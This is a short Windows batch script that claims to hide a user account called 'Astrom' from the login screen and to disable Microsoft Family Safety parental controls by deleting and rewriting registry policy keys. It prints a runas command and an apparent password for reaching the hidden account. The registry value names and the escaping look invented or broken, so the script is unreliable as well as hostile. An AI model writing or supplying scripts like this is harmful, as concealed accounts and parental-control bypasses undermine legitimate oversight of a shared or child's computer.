
@echo off
REM User-mode Astrom hide - NO ADMIN password needed
powershell -Command "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name 'NoUserAdmins' -Value 1 -Force"
taskkill /f /im explorer.exe /t ^& start explorer.exe
echo Astrom hidden from login screen! ^
Access: Win+R ^> runas /user:Astrom cmd ^<hack2024
echo Family Safety disable attempt:
powershell -ExecutionPolicy Bypass -Command ^
"$policy = 'HKCU:\Software\Policies\Microsoft\Windows\FamilySafety'; ^
if (Test-Path $policy) {Remove-Item $policy -Recurse -Force}; ^
New-Item $policy -Force | Out-Null; ^
Set-ItemProperty $policy 'LockForChild' 0"
pause

